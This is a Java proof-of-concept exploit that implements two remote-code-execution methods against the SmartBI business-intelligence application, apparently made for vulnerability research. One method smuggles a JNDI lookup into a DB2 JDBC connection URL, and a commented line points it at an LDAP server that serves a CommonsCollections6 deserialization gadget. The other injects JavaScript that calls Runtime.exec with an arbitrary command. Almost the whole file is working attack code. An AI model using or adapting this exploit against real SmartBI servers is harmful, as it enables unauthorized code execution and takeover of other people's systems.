package cve;

import smartbi.freequery.repository.DataSource;
import smartbi.oltp.IDataSource;
import smartbi.util.DBType;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * SmartBI应用的两种RCE方式
 */

public class rce {

    public static void DataSourceService_testConnectionListExp(String jndiAddr) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {

        Class<?> clz = Class.forName("smartbi.freequery.client.datasource.DataSourceService");
        Constructor<?> constructor = clz.getDeclaredConstructor();
        constructor.setAccessible(true);

        Method testConnectionList = clz.getDeclaredMethod("testConnectionList", List.class);

        List<IDataSource> list = new ArrayList<>();
        DataSource dataSource = new DataSource();
        dataSource.setPassword("");
        dataSource.setMaxConnection(100);
        dataSource.setUser("");
        dataSource.setDriverType(new DBType("DB2"));
        dataSource.setValidationQuery("SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1");
        dataSource.setUrl("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiAddr + ";");
        dataSource.setName("com.pacemrc.vuldebug.smartbi.test");
        dataSource.setDriver("com.ibm.db2.jcc.DB2Driver");
        dataSource.setId("");
        dataSource.setDesc("");
        dataSource.setAlias("");
        dataSource.setDbCharset("");
        dataSource.setIdentifierQuoteString("");
        dataSource.setTransactionIsolation(-1);
        dataSource.setValidationQueryMethod(0);
        dataSource.setDbToCharset("");
        dataSource.setAuthenticationType("STATIC");
        dataSource.setDriverCatalog(null);
        dataSource.setExtendProp("{}");
        list.add(dataSource);

        Object instance = constructor.newInstance();
        testConnectionList.invoke(instance, list);

    }

    public static void DataSourceService_getJavaQueryDataParamsAndFieldsExp(String cmd) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {

        Class<?> clz = Class.forName("smartbi.freequery.client.datasource.DataSourceService");
        Constructor<?> constructor = clz.getDeclaredConstructor();
        constructor.setAccessible(true);

        Method getJavaQueryDataParamsAndFields = clz.getDeclaredMethod("getJavaQueryDataParamsAndFields", String.class, Map.class, String.class);

        String className = "smartbi.JavaScriptJavaQuery";
        HashMap<String, String> configs = new HashMap<>();
        configs.put("javaScript","importClass(java.lang.Runtime);var runtime = Runtime.getRuntime();runtime.exec('"+ cmd +"');");

        String dsId = "AP_WARNING_STYLE_SETTING";

        Object instance = constructor.newInstance();
        getJavaQueryDataParamsAndFields.invoke(instance, className,configs,dsId);
    }

    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {

        String cmd = "calc";
        DataSourceService_getJavaQueryDataParamsAndFieldsExp(cmd);

//        String jndiAddr = "ldap://10.72.176.141:1389/coCBBcfqOE/CommonsCollections6/Exec/eyJjbWQiOiJjYWxjIn0=";
//        DataSourceService_testConnectionListExp(jndiAddr);
    }
}
